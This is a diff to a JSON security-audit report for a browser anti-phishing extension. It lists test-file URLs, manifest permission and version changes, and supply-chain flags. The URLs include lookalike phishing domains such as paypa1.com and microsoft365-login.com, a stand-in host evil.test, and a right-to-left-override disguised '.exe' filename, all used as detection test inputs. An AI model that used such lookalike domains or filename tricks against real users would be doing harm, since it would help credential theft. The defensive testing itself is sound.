+    {
+      "file": "tests/p0-regressions.test.cjs",
+      "line": 86,
+      "url": "https://sparkasse-kontoauszug.de/"
+    },
+    {
+      "file": "tests/p0-regressions.test.cjs",
+      "line": 87,
+      "url": "https://paypal-kundenservice.de/"
+    },
+    {
+      "file": "tests/p0-regressions.test.cjs",
+      "line": 88,
+      "url": "https://microsoft365-login.com/"
+    },
+    {
+      "file": "tests/p0-regressions.test.cjs",
+      "line": 89,
+      "url": "https://amazonprime-login.com/"
+    },
+    {
+      "file": "tests/p0-regressions.test.cjs",
+      "line": 90,
+      "url": "https://appleid-login.com/"
+    },
+    {
+      "file": "tests/p0-regressions.test.cjs",
+      "line": 95,
+      "url": "https://paypal-gmbh.de/"
+    },
+    {
+      "file": "tests/platin-security.test.cjs",
+      "line": 28,
+      "url": "https://paypa1.com/"
+    },
+    {
+      "file": "tests/platin-security.test.cjs",
+      "line": 157,
+      "url": "https://example.com/?"
+    },
+    {
+      "file": "tests/platin-security.test.cjs",
+      "line": 158,
+      "url": "https://example.com/?"
+    },
+    {
+      "file": "tests/platin-security.test.cjs",
+      "line": 180,
+      "url": "https://paypa1.com/"
+    },
+    {
+      "file": "tests/platin-security.test.cjs",
+      "line": 180,
+      "url": "https://evil.test/"
+    },
+    {
+      "file": "tests/platin-security.test.cjs",
+      "line": 185,
+      "url": "https://paypa1.com/"
+    },
+    {
+      "file": "tests/platin-security.test.cjs",
+      "line": 189,
+      "url": "https://evil.test/"
+    },
+    {
+      "file": "tests/platin-security.test.cjs",
+      "line": 190,
+      "url": "https://paypa1.com/"
+    },
+    {
+      "file": "tests/platin-security.test.cjs",
+      "line": 203,
+      "url": "https://paypa1.com/"
+    },
+    {
+      "file": "tests/platin-security.test.cjs",
+      "line": 203,
+      "url": "https://evil.test/"
+    },
+    {
+      "file": "tests/platin-security.test.cjs",
+      "line": 205,
+      "url": "https://paypa1.com/"
+    },
+    {
+      "file": "tests/platin-security.test.cjs",
+      "line": 207,
+      "url": "https://evil.test/"
+    },
+    {
+      "file": "tests/platin-security.test.cjs",
+      "line": 208,
+      "url": "https://paypa1.com/"
+    },
+    {
+      "file": "tests/platin-security.test.cjs",
+      "line": 222,
+      "url": "https://paypa1.com/"
+    },
+    {
+      "file": "tests/platin-security.test.cjs",
+      "line": 239,
+      "url": "https://paypa1.com/"
+    },
+    {
+      "file": "tests/platin-security.test.cjs",
+      "line": 244,
+      "url": "https://example.com/"
+    },
+    {
+      "file": "tests/platin-security.test.cjs",
+      "line": 245,
+      "url": "https://paypa1.com/"
+    },
+    {
+      "file": "tests/platin-security.test.cjs",
+      "line": 252,
+      "url": "https://paypa1.com/"
+    },
+    {
+      "file": "tests/platin-security.test.cjs",
+      "line": 260,
+      "url": "https://paypa1.com/"
+    },
+    {
+      "file": "tests/platin-security.test.cjs",
+      "line": 269,
+      "url": "https://paypa1.com/secret-path?token=123"
+    },
+    {
+      "file": "tests/shield-content.test.cjs",
+      "line": 119,
+      "url": "https://legit-blog.com/page"
+    },
+    {
+      "file": "tests/shield-content.test.cjs",
+      "line": 120,
+      "url": "https://paypa1.com/login"
+    },
+    {
+      "file": "tests/shield-content.test.cjs",
+      "line": 130,
+      "url": "https://paypa1.com/login"
+    },
+    {
+      "file": "tests/shield-content.test.cjs",
+      "line": 141,
+      "url": "https://www.paypal.com/signin"
+    },
+    {
+      "file": "tests/shield-content.test.cjs",
+      "line": 142,
+      "url": "https://www.paypal.com/auth"
+    },
+    {
+      "file": "tests/shield-content.test.cjs",
+      "line": 153,
+      "url": "https://evil.test/paypal/login"
+    },
+    {
+      "file": "tests/shield-content.test.cjs",
+      "line": 162,
+      "url": "https://google.com/"
+    },
+    {
+      "file": "tests/shield-content.test.cjs",
+      "line": 172,
+      "url": "https://paypa1.com/login"
+    },
+    {
+      "file": "tests/shield-content.test.cjs",
+      "line": 176,
+      "url": "https://evil.test/paypal/login"
+    },
+    {
+      "file": "tests/tracker-shield.test.cjs",
+      "line": 9,
+      "url": "https://store.example.com/checkout?item=123&utm_source=newsletter&fbclid=abc123xyz"
+    },
+    {
+      "file": "tests/tracker-shield.test.cjs",
+      "line": 168,
+      "url": "https://www.google-analytics.com/collect"
+    },
+    {
+      "file": "tests/tracker-shield.test.cjs",
+      "line": 178,
+      "url": "https://store.example.com/checkout?item=123&utm_source=newsletter&fbclid=abc123xyz"
+    },
+    {
+      "file": "tests/v2-scoring.test.cjs",
+      "line": 8,
+      "url": "https://amaxon.com"
+    },
+    {
+      "file": "tests/v2-scoring.test.cjs",
+      "line": 15,
+      "url": "https://microsmft.com"
+    },
+    {
+      "file": "tests/v2-scoring.test.cjs",
+      "line": 21,
+      "url": "https://gongle.com"
+    },
+    {
+      "file": "tests/v2-scoring.test.cjs",
+      "line": 29,
+      "url": "https://unrelated-domain.com/paypal/login"
+    },
+    {
+      "file": "tests/v2-scoring.test.cjs",
+      "line": 36,
+      "url": "https://compromised-server.net/chase/signin"
+    },
+    {
+      "file": "tests/v2-scoring.test.cjs",
+      "line": 42,
+      "url": "https://phish-host.org/paypal.com/verify"
+    },
+    {
+      "file": "tests/v2-scoring.test.cjs",
+      "line": 48,
+      "url": "https://techblog.com/docs/paypal-integration-guide"
+    },
+    {
+      "file": "tests/v2-scoring.test.cjs",
+      "line": 49,
+      "url": "https://devnews.org/articles/apple-announces-m4"
+    },
+    {
+      "file": "tests/v2-scoring.test.cjs",
+      "line": 50,
+      "url": "https://example.com/guide/amazon-aws-tutorial"
+    },
+    {
+      "file": "tests/v2-scoring.test.cjs",
+      "line": 55,
+      "url": "https://example.com/\\u202Egpj.exe"
+    },
+    {
+      "file": "tests/v2-scoring.test.cjs",
+      "line": 65,
+      "url": "https://paypa1.com"
+    },
+    {
+      "file": "tests/v2-scoring.test.cjs",
+      "line": 81,
+      "url": "https://paypal-login.com"
+    },
+    {
+      "file": "tests/v2-scoring.test.cjs",
+      "line": 86,
+      "url": "https://google.com"
     }
   ],
   "todo_markers": [],
   "html_report": [
     {
       "file": "chrome/guard.html",
+      "inline_scripts": 0,
+      "inline_handlers": 0,
+      "remote_refs": []
+    },
+    {
+      "file": "chrome/options.html",
       "inline_scripts": 0,
       "inline_handlers": 0,
       "remote_refs": []
@@ -977,6 +4472,12 @@
       "remote_refs": []
     },
     {
+      "file": "firefox/options.html",
+      "inline_scripts": 0,
+      "inline_handlers": 0,
+      "remote_refs": []
+    },
+    {
       "file": "firefox/popup.html",
       "inline_scripts": 0,
       "inline_handlers": 0,
@@ -984,6 +4485,12 @@
     },
     {
       "file": "shared/guard.html",
+      "inline_scripts": 0,
+      "inline_handlers": 0,
+      "remote_refs": []
+    },
+    {
+      "file": "shared/options.html",
       "inline_scripts": 0,
       "inline_handlers": 0,
       "remote_refs": []
@@ -998,12 +4505,13 @@
   "manifests": {
     "chrome": {
       "manifest_version": 3,
-      "version": "0.1.0",
+      "version": "0.2.3",
       "permissions": [
         "declarativeNetRequest",
         "storage",
         "tabs",
-        "webNavigation"
+        "webNavigation",
+        "webRequest"
       ],
       "host_permissions": [
         "http://*/*",
@@ -1030,7 +4538,7 @@
     },
     "firefox": {
       "manifest_version": 3,
-      "version": "0.1.0",
+      "version": "0.2.3",
       "permissions": [
         "storage",
         "tabs",
@@ -1041,7 +4549,17 @@
         "http://*/*",
         "https://*/*"
       ],
-      "web_accessible_resources": [],
+      "web_accessible_resources": [
+        {
+          "resources": [
+            "guard.html"
+          ],
+          "matches": [
+            "http://*/*",
+            "https://*/*"
+          ]
+        }
+      ],
       "externally_connectable": null,
       "content_security_policy": null,
       "background": {
@@ -1053,24 +4571,30 @@
       },
       "minimum_chrome_version": null,
       "gecko": {
-        "id": "antipisher@visiongaia.example",
-        "strict_min_version": "128.0"
+        "id": "antipisher@visiongaia.org",
+        "strict_min_version": "128.0",
+        "data_collection_permissions": {
+          "required": [
+            "none"
+          ]
+        }
       }
     }
   },
   "supply_chain": {
-    "vcs_present": false,
+    "vcs_present": true,
     "release_config_present": [],
-    "ci_dirs_present": [],
+    "ci_dirs_present": [
+      ".github/workflows"
+    ],
     "lockfiles": [],
-    "sbom_present": false
+    "sbom_present": true
   },
   "version_claims": {
-    "README.md": "0.1.0",
-    "Next.md": "0.1.0",
-    "chrome/manifest.json": "0.1.0",
-    "firefox/manifest.json": "0.1.0",
-    "SECURITY.md": null
+    "README.md": "0.2.3",
+    "chrome/manifest.json": "0.2.3",
+    "firefox/manifest.json": "0.2.3",
+    "SECURITY.md": "0.2.3"
   },
   "license_present": true,
   "license_size": 34427
